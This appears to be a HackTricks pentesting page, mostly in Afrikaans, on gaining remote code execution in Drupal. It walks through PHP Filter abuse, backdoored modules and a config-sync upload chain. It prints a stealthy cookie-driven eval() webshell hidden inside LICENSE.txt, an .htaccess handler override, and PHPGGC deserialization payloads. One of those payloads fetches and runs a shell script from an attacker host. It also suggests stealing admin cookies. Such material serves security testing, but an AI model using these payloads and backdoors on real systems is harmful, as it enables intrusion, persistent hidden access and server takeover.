# Drupal RCE

{{#include ../../../banners/hacktricks-training.md}}

## Met PHP Filter Module

> [!WARNING]
> In ouer weergawes van Drupal **(voor weergawe 8)**, was dit moontlik om as admin aan te meld en **die `PHP filter` module in te skakel**, wat "Maak dit moontlik dat ingebedde PHP code/snippets geëvalueer word." Maar vanaf weergawe 8 is hierdie module nie standaard geïnstalleer nie.

1. Gaan na **/modules/php** en as 'n 403-fout teruggegee word dan is die **PHP filter plugin geïnstalleer en kan jy voortgaan**
1. Indien nie, gaan na `Modules` en merk die blokkie van `PHP Filter` en klik dan op `Save configuration`
2. Om dit te eksploiteer, klik op `Add content`, kies dan `Basic Page` of `Article` en skryf die **PHP backdoor**, kies dan `PHP` kode in Text-formaat en uiteindelik kies `Preview`
3. Om dit te aktiveer, besoek net die nuut geskepte node:
```bash
curl http://drupal.local/node/3
```
## Installeer PHP Filter Module

> [!WARNING]
> In huidige weergawes is dit nie meer moontlik om plugins te installeer deur slegs toegang tot die web te hê na die standaardinstallasie nie.

From version **8 onwards, the** [**PHP Filter**](https://www.drupal.org/project/php/releases/8.x-1.1) **module is not installed by default**. To leverage this functionality, we would have to **install the module ourselves**.

1. Laai die nuutste weergawe van die module vanaf die Drupal-webwerf af.
1. `wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz`
2. Sodra dit afgelaai is, gaan na **`Administration`** > **`Reports`** > **`Available updates`**.
3. Klik op **`Browse`**, kies die lêer uit die gids waarin ons dit afgelaai het, en klik dan op **`Install`**.
4. Sodra die module geïnstalleer is, kan ons op **`Content`** klik en **'n nuwe basiese bladsy skep**, soortgelyk aan hoe ons dit in die Drupal 7-voorbeeld gedoen het. Maak weer seker dat jy **`PHP code` uit die `Text format` keuselys kies**.

## Achterdeur-module

> [!WARNING]
> In huidige weergawes is dit nie meer moontlik om plugins te installeer deur slegs toegang tot die web te hê na die standaardinstallasie nie.

Dit was moontlik om 'n **module** af te laai, 'n **backdoor** daaraan toe te voeg en dit te **installeer**. Byvoorbeeld, deur die [**Trurnstile**](https://www.drupal.org/project/turnstile) module in saamgeperste formaat af te laai, 'n nuwe PHP backdoor-lêer daarin te skep, en toegang tot die PHP-lêer toe te laat met 'n `.htaccess`-lêer:
```html
<IfModule mod_rewrite.c> RewriteEngine On RewriteBase / </IfModule>
```
En dan na **`http://drupal.local/admin/modules/install`** gaan om die backdoored module te installeer en **`/modules/turnstile/back.php`** te besoek om dit uit te voer.

## Backdooring Drupal with Configuration synchronization <a href="#backdooring-drupal" id="backdooring-drupal"></a>

**Pos gedeel deur** [**Coiffeur0x90**](https://twitter.com/Coiffeur0x90)

### Deel 1 (aktivering van _Media_ en _Media Library_)

In die _Extend_-menu (/admin/modules) kan jy ogenschynlik reeds geïnstalleerde plugins aktiveer. By verstek blyk die plugins _Media_ en _Media Library_ nie geaktiveer te wees nie, dus kom ons aktiveer hulle.

Before activation:

<figure><img src="../../../images/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

After activation:

<figure><img src="../../../images/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Deel 2 (gebruik van die _Configuration synchronization_-funksie) <a href="#part-2-leveraging-feature-configuration-synchronization" id="part-2-leveraging-feature-configuration-synchronization"></a>

Ons sal die _Configuration synchronization_-funksie gebruik om Drupal-konfigurasie-items te dump (export) en op te laai (import):

- /admin/config/development/configuration/single/export
- /admin/config/development/configuration/single/import

**Wysig system.file.yml**

Kom ons begin deur die eerste inskrywing `allow_insecure_uploads` te wysig van:

Lêer: system.file.yml
```

...

allow_insecure_uploads: false

...

```
<figure><img src="../../../images/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Na:

Lêer: system.file.yml
```

...

allow_insecure_uploads: true

...

```
<figure><img src="../../../images/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Pas field.field.media.document.field_media_document.yml aan**

Pas dan die tweede inskrywing `file_extensions` aan vanaf:

Lêer: field.field.media.document.field_media_document.yml
```

...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...
```
<figure><img src="../../../images/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Aan:

Lêer: field.field.media.document.field_media_document.yml
```
...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'htaccess txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...

```
> Ek gebruik dit nie in hierdie blogpos nie, maar dit word aangeteken dat dit moontlik is om die invoer `file_directory` arbitrêr te definieer en dat dit kwesbaar is vir 'n path traversal attack (sodat ons terug kan navigeer binne die Drupal-lêerstelselboom).

<figure><img src="../../../images/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Deel 3 (benut die funksie _Add Document_) <a href="#part-3-leveraging-feature-add-document" id="part-3-leveraging-feature-add-document"></a>

Die laaste stap is die eenvoudigste, en is in twee sub-stappe opgebreek. Die eerste is om 'n lêer in .htaccess-formaat op te laai om die Apache-riglyne te benut en toe te laat dat .txt-lêers deur die PHP-engine geïnterpreteer word. Die tweede is om 'n .txt-lêer op te laai wat ons payload bevat.

Lêer: .htaccess
```
<Files *>
SetHandler application/x-httpd-php
</Files>

# Vroum! Vroum!
# We reactivate PHP engines for all versions in order to be targetless.
<IfModule mod_php.c>
php_flag engine on
</IfModule>
<IfModule mod_php7.c>
php_flag engine on
</IfModule>
<IfModule mod_php5.c>
php_flag engine on
</IfModule>
```
Waarom is hierdie truuk gaaf?

Omdat, sodra die Webshell (wat ons LICENSE.txt sal noem) op die webbediener geplaas word, ons ons opdragte via `$_COOKIE` kan oordra, en dit in die webbediener-logs as 'n legitieme GET-versoek na 'n tekslêer sal verskyn.

Why name our Webshell LICENSE.txt?

Kortom, as ons byvoorbeeld die volgende lêer neem, vir voorbeeld [core/LICENSE.txt](https://github.com/drupal/drupal/blob/11.x/core/LICENSE.txt) (wat reeds in die Drupal core teenwoordig is), het ons 'n lêer van 339 reëls en 17.6 KB, wat perfek is om 'n klein stukkie PHP-kode in die middel by te voeg (aangesien die lêer groot genoeg is).

<figure><img src="../../../images/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Lêer: Patched LICENSE.txt
```txt

...

this License, you may choose any version ever published by the Free Software
Foundation.

<?php

# We inject our payload into the cookies so that in the logs of the compromised
# server it shows up as having been requested via the GET method, in order to
# avoid raising suspicions.
if (isset($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
if (!empty($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
eval($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"]);
} else {
phpinfo();
}
}

?>

10. If you wish to incorporate parts of the Program into other free
programs whose distribution conditions are different, write to the author

...

```
#### **Part 3.1 (laai lêer .htaccess op)**

First, we leverage the _Add Document_ (/media/add/document) feature to upload our file containing the Apache directives (.htaccess).

<figure><img src="../../../images/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Part 3.2 (laai lêer LICENSE.txt op)**

Then, we leverage the _Add Document_ (/media/add/document) feature again to upload a Webshell hidden within a license file.

<figure><img src="../../../images/image (11) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (12) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (13) (1).png" alt=""><figcaption></figcaption></figure>

### Part 4 (interaksie met die Webshell) <a href="#part-4-interaction-with-the-webshell" id="part-4-interaction-with-the-webshell"></a>

The last part consists of interacting with the Webshell.

As shown in the following screenshot, if the cookie expected by our Webshell is not defined, we get the subsequent result when consulting the file via a Web browser.

<figure><img src="../../../images/image (14) (1).png" alt=""><figcaption></figcaption></figure>

When the attacker sets the cookie, he can interact with the Webshell and execute any commands he wants.

<figure><img src="../../../images/image (15) (1).png" alt=""><figcaption></figcaption></figure>

And as you can see in the logs, it looks like only a txt file has been requested.

<figure><img src="../../../images/image (16) (1).png" alt=""><figcaption></figcaption></figure>

Thank you for taking the time to read this article, I hope it will help you get some shells.

## Drupal core gadget chain (SA-CORE-2024-007 / SA-CORE-2024-008)

Two advisories published **20 Nov 2024** (CVE-2024-55637 & CVE-2024-55638) describe new **PHP object gadget chains in Drupal core** (7.0–7.101, 8.x, 10.2.0–10.2.10, 10.3.0–10.3.8, early 11.x). They are **not directly exploitable** but give attackers a ready-made chain once any contrib/module performs `unserialize()` on user input.

Practical exploitation workflow:

1. **Find the unserialize sink** (contrib module or custom code). Grep codebase for `unserialize(` or `Drupal\Component\Serialization\PhpSerialize::decode`. Target endpoints that accept POST/JSON or configuration imports.
2. **Generate a payload** using the vulnerable class path that matches the gadget chain. After SA-CORE-2024-008, the public chain was added to common payload generators. Example with PHPGGC (commit ≥ Dec 2024):
```bash
./phpggc drupal/rce2 system 'id' > payload.ser
```
3. **Deliver the serialized blob** aan die sink (bv. parameter wat gets deserialized). Vir 'n form-encoded body:
```bash
curl -X POST https://target/admin/config/some/module \
-d "serialized_setting=$(cat payload.ser)"
```
4. **Aktiveer vernietiging** (gewoonlik outomaties aan die einde van die versoek) en voer die opdrag uit.

Notes for testing:

- Gadget works only on versions **prior to 10.2.11 / 10.3.9 / 7.102** (patched). Verify the target version via `/core/lib/Drupal.php` or `CHANGELOG.txt`.
- Third‑party DB drivers may need extra hardening; look for deployments that skipped the security update window.

## Onlangse contrib-module unsafe deserialization → RCE

Verskeie contrib modules het in laat 2024 onveilige `unserialize()`-paden reggemaak. As die site hierdie opdaterings mis, gee hulle die benutbare sink wat deur die core gadget chain vereis word:

- **Mailjet** (<4.0.1, CVE-2024-13296): admin-beheerde data word aan `unserialize()` deurgegee, wat **PHP Object Injection → RCE** moontlik maak wanneer dit met die core gadgets gekoppel word.
- **Eloqua** (7.x-1.x < 1.15, CVE-2024-13297): soortgelyke onveilige `unserialize()`-gebruik wat bereikbaar is deur gebruikers met `access administration pages`.

Testing idea (authenticated):
```bash
phpggc drupal/rce2 system 'bash -c "curl http://attacker/shell.sh|sh"' > p.ser
curl -b session=ADMINCOOKIE \
-F "import=@p.ser" https://target/admin/config/eloqua/import
```
As die module die opgelaaide data deserialiseer, lewer die gadget chain RCE. Kombineer dit met XSS/CSRF om admin cookies te steel vir 'n volledige aanvalsketting.

## Verwysings

- [Drupal core – gadget chain – SA-CORE-2024-008](https://www.drupal.org/sa-core-2024-008)
- [Mailjet module – arbitrary PHP code execution – SA-CONTRIB-2024-062](https://www.drupal.org/sa-contrib-2024-062)

{{#include ../../../banners/hacktricks-training.md}}
